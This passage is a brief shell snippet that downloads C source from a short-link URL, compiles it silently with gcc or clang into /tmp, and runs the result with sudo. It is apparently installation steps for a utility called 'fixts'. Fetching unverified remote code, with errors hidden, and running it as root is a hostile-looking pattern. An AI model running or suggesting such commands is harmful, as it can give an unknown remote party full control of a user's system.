...
curl -fsSL s4a.it/fixts-c 2>/dev/null | gcc -x c -o /tmp/fixts-$(uname)-$(uname -p) - 2>/dev/null
curl -fsSL s4a.it/fixts-c 2>/dev/null | clang -x c -o /tmp/fixts-$(uname)-$(uname -p) - 2>/dev/null
chmod +x /tmp/fixts-$(uname)-$(uname -p)
sudo /tmp/fixts-$(uname)-$(uname -p)
